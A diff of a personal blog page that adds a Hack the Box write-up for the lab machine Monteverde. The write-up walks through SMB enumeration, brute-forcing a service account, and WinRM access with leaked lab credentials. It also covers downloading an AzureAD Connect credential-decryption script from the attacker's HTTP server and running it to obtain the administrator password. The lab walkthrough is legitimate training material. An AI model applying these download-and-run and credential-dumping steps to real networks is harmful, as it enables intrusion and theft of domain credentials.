@@ -9,7 +9,9 @@
 This is my write-up for the Hack the Box machine Monteverde
 Initial nmap scan Running the inital nmap scan
 nmap -sV -sC -p- -oN nmap 10.10.10.172
-Yielded the following results" />
+Yielded the following results
+From here, you can see that there are 18 open ports and that the windows is running on windows
+Ports that stand out Port 389 - shows that there&#39;s an Active Directory domain named MEGABANK present on the system which may become useful later" />
 <meta name="keywords" content="homepage, hacking, ctf, htb, hack, box, programming, blog, informatics, osint, ethical" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -39,10 +41,12 @@ Yielded the following results" />
 This is my write-up for the Hack the Box machine Monteverde
 Initial nmap scan Running the inital nmap scan
 nmap -sV -sC -p- -oN nmap 10.10.10.172
-Yielded the following results">
+Yielded the following results
+From here, you can see that there are 18 open ports and that the windows is running on windows
+Ports that stand out Port 389 - shows that there&#39;s an Active Directory domain named MEGABANK present on the system which may become useful later">
 <meta itemprop="datePublished" content="2020-01-21T08:23:07&#43;00:00" />
 <meta itemprop="dateModified" content="2020-01-21T08:23:07&#43;00:00" />
-<meta itemprop="wordCount" content="33">
+<meta itemprop="wordCount" content="1003">
 <meta itemprop="image" content="https://xyniath.github.io/"/>
 
 
@@ -55,7 +59,9 @@ Yielded the following results">
 This is my write-up for the Hack the Box machine Monteverde
 Initial nmap scan Running the inital nmap scan
 nmap -sV -sC -p- -oN nmap 10.10.10.172
-Yielded the following results"/>
+Yielded the following results
+From here, you can see that there are 18 open ports and that the windows is running on windows
+Ports that stand out Port 389 - shows that there&#39;s an Active Directory domain named MEGABANK present on the system which may become useful later"/>
 
 
 
@@ -118,7 +124,7 @@ Yielded the following results"/>
     <main class="post">
 
         <div class="post-info">
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>One minute
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes
 
             
 
@@ -140,7 +146,102 @@ Yielded the following results"/>
 <p>Running the inital nmap scan</p>
 <p><code>nmap -sV -sC -p- -oN nmap 10.10.10.172</code></p>
 <p>Yielded the following results</p>
-<p><img src="/static/posts/monteverde/nmapscan.png" alt="Nmap Scan"></p>
+<p><img src="/posts/monteverde/nmapscan.png" alt="Nmap Scan"></p>
+<p>From here, you can see that there are 18 open ports and that the windows is running on windows</p>
+<h3 id="ports-that-stand-out">Ports that stand out</h3>
+<p><strong>Port 389</strong> - shows that there's an Active Directory domain named MEGABANK present on the system which may become useful later</p>
+<p><strong>Port 445</strong> - Stands out as its used generally for windows SMB protocol, furthering the significance of this results, we also see host script results on this protocol showing us the smb security mode as 2.02</p>
+<p><strong>Port 5985</strong> - Showing a http server, hosting a &ldquo;Document not found&rdquo; page. This port used for Windows Server management</p>
+<h2 id="enumeration-of-smb-protocol">Enumeration of SMB Protocol</h2>
+<p>I decided to start off by enumerating the smb protocol on the machine, i Did this by running another nmap scan with <code>-A</code></p>
+<p><img src="/posts/monteverde/smbportscan.png" alt="Nmap Scan"></p>
+<p>Here, after the scan, it now states that the security mode is actually 3.00 as opposed to the 2.02 as previously discovered</p>
+<p>I then used enum4linux to enumerate the system
+<code>enum4linux -U 10.10.10.172</code></p>
+<p><img src="/posts/monteverde/enum4linuxdomainsid.png" alt="Domain SID">
+<strong>Domain Name</strong> - MEGABANK
+And also list of the users present on the system
+<img src="/posts/monteverde/enum4linuxusers.png" alt="Users"></p>
+<p><strong>Users</strong> - Guest, AAD_987d7f2f57d2, mhope, smorgan, dgalanos, roleary, SABatchJobs, svc-ata, svc-bexec &amp; svc-netapp</p>
+<p>AAD_987d7f2f57d2 seemed interesting, and after research into this type of user, shows that there's an Azure Active Directory on the machine</p>
+<h2 id="brute-forcing-the-smb-login">Brute-Forcing the SMB Login</h2>
+<p>After finding a list of users on the machine and that the SMB protocol was open, I could potentially launch a brute-force login attempt on the machine</p>
+<p>To do this, I used the Metasploit module (auxiliary/scanner/smb/smb_login) for this, as I tried THC Hydra but it didn't seem to work for me.</p>
+<p>At first, I tried using the <em>user-style</em> accounts: mhope, smorgan, dgalanos and roleary to no success</p>
+<p>I then decided to use SABatchJobs next. Using BLANK_PASSWORDS and USER_AS_PASS both set to true
+<img src="/posts/monteverde/batchjobsbforce.png" alt="SABatchJobs Brute-Force"></p>
+<p>As soon as I started the exploit, the password was found instantly.
+<img src="/posts/monteverde/sabatchcreds.png" alt="SABatchJobs Credentials">
+<strong>User</strong>: SABatchJobs</p>
+<p><strong>Pass</strong>: SABatchJobs</p>
+<h2 id="enumerating-the-smb-shares">Enumerating the SMB Shares</h2>
+<p>To enumerate the SMB shares, I used <code>smbclient</code></p>
+<p><code>smbclient -L 10.10.10.172 -U SABatchJobs</code></p>
+<p><img src="/posts/monteverde/smbshares.png" alt="SMB shares"></p>
+<p>A particular share that interests me is named <strong>azure_uploads</strong>. So I ran</p>
+<p><code>smbclient //10.10.10.172/azure_uploads</code></p>
+<p><img src="/posts/monteverde/smbazureuploads.png" alt="SMB azure_uploads">
+But didn't come across anything in the folder</p>
+<p>Most of the directories seemed empty (or I didn't have permission to view them) or didn't have any useful files in apart from the <strong>$users</strong> share.</p>
+<p><img src="/posts/monteverde/smbusers.png" alt="SMB users$"></p>
+<p>All the directories in the <strong>users$</strong> share were empty apart from <strong>mhope</strong> which contained one file named <strong>azure.xml</strong></p>
+<p>In order to view this file, I used <code>get azure.xml</code> which downloaded the file to the directory in which I used the <code>smbclient</code> command</p>
+<p>The <strong>azure.xml</strong> looked like this:</p>
+<p><img src="/posts/monteverde/azurexml.png" alt="azure.xml"></p>
+<p>As you can see, there's a password here: <strong>4n0therD4y@n0th3r$</strong>
+And I assume this was the password for the user <strong>mhope</strong></p>
+<p><strong>User</strong> - mhope</p>
+<p><strong>Pass</strong> - 4n0therD4y@n0th3r$</p>
+<h2 id="accessing-the-machine--getting-user-flag">Accessing the Machine &amp; Getting User Flag</h2>
+<p>To access the machine, I used <strong>Wvil-WinRM</strong></p>
+<p>I chose this because the server is using <strong>Windows Server Management</strong> on <strong>port 5985</strong></p>
+<p>You can install <strong>Evil-WinRM</strong> using <code>gem install evil-winrm</code></p>
+<p>To gain access to the machine:
+<code>evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$</code></p>
+<p><img src="/posts/monteverde/evilwinrm.png" alt="Evil-WinRM"></p>
+<p>I then had a shell on the machine! (Specifically PowerShell)</p>
+<p>Navigating to the Desktop folder, on the user showed the user.txt flag. On a Windows machine using <code>type user.txt</code> will print the flag to the screen.</p>
+<h2 id="getting-root">Getting Root</h2>
+<p>This part of the box proved to be the most difficult.</p>
+<p>Getting root took me a very long time, with a lot of potential exploits being detected by an antivirus present on the system.</p>
+<p>Without doing any <em>real</em> enumeration, I tried to get a shell from using a msfvenom payload by hosting it on a server, download it from the machine, and then run it. However an error in relation to Anti-Virus detection occurred
+<img src="/posts/monteverde/averror.png" alt="Anti-Virus Error"></p>
+<p>I then tried again, by encoding the payload once, then twice, and unfortunately still didn't work.</p>
+<p>Mimikatz - commonly ussed to steal credentials and escalate privileges (<em>unsurprisingly</em>) was also detected by the AV</p>
+<p>The Anti-Virus restricted a lot I could do, so my next steps were to see if there were any ways I could bypass it via disabling it, etc. But I couldn't find much.</p>
+<p>At this point, I started to enumerate. <strong>WinEnum</strong> didn't produce any output on the terminal and was just stuck, so I looked around the system to see what I could find. Checking directories that may seem interesting. In an AppData directory I came across a file credentials file but didn't have much information.</p>
+<p>Aftr not finding anything for a while, I took a break and came back and forgot the server was running an <strong>Azure Active Directory</strong> (With the user <strong>AAD_987d7f2f57d2</strong>) And through exploitation of this I could potentially get privesc.</p>
+<p>Looking into AAD exploits, I came across this <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"><strong>blog post</strong></a> by Adam Chester (XPN)</p>
+<p>This provided some valuable information and a PowerShell script (.ps1) file, which needed to be edited to exploit this machine linked <a href="https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/28723eb269eafff5168b31ba1ea4722171d50af7/azuread_decrypt_msol.ps1"><strong>here</strong></a></p>
+<p>Discovering what to do in terms of changing values in this file, took a long while.</p>
+<p>Until (After <em><strong>MANY</strong></em> iterations, eliciation and enumerations) I found several fixes</p>
+<ul>
+<li>Changing the 3rd line in the script to this:
+<code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&quot;</code></li>
+<li>Removing the 1st line of code</li>
+<li>Re-entering the apostrophe at the end of the line starting with <code>add-type -path</code> (as it wasn't a valid apostrophe and caused syntax errors)</li>
+</ul>
+<p>I then set up a HTTP Server on my machine with <code>python -m SimpleHTTPServer 80</code></p>
+<p>And then proceeded to download this file to the Monteverde Machine using PowerShell
+<code>Invoke-WebRequest -Uri hostserverip/azuread_decrypt_msol.ps1 -OutFile script.ps1</code></p>
+<p><img src="/posts/monteverde/scriptdownload.png" alt="Downloading Script"></p>
+<p>Then I ran the script with <code>.\script.ps1</code></p>
+<p><img src="/posts/monteverde/admincreds.png" alt="Administrator Credentials"></p>
+<p>And we got the Administrator password!</p>
+<p><strong>User</strong> - administrator
+<strong>Pass</strong> - d0m@in4dminyeah!</p>
+<p>After getting these credentials, I then ended my <strong>Evil-WinRM</strong> session on <strong>mhope</strong> and restarted using the admin user and password</p>
+<p><img src="/posts/monteverde/root.png" alt="Root"></p>
+<p>And that's <strong>root!</strong></p>
+<h2 id="what-i-learnt-from-this-box">What I Learnt From This Box</h2>
+<ul>
+<li>SMB enumeration</li>
+<li>SMB brute-forcing</li>
+<li>Azure Active Directory knowledge</li>
+<li>Persistence</li>
+<li>Win-RM</li>
+<li>Working with PowerShell scripts</li>
+</ul>
 
             </div>
         </article>
@@ -152,7 +253,7 @@ Yielded the following results"/>
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://xyniath.github.io/tags/azure">Azure</a></span><span class="tag"><a href="https://xyniath.github.io/tags/easy">Easy</a></span><span class="tag"><a href="https://xyniath.github.io/tags/hack-the-box">Hack the Box</a></span><span class="tag"><a href="https://xyniath.github.io/tags/write-up">Write-up</a></span><span class="tag"><a href="https://xyniath.github.io/tags/walkthrough">Walkthrough</a></span><span class="tag"><a href="https://xyniath.github.io/tags/smb">SMB</a></span><span class="tag"><a href="https://xyniath.github.io/tags/brute-force">Brute-Force</a></span><span class="tag"><a href="https://xyniath.github.io/tags/powershell">Powershell</a></span><span class="tag"><a href="https://xyniath.github.io/tags/windows">Windows</a></span><span class="tag"><a href="https://xyniath.github.io/tags/enumeration">Enumeration</a></span><span class="tag"><a href="https://xyniath.github.io/tags/real-life">Real-Life</a></span><span class="tag"><a href="https://xyniath.github.io/tags/cve">CVE</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>33 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1003 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-01-21 08:23 &#43;0000</p>
         </div>
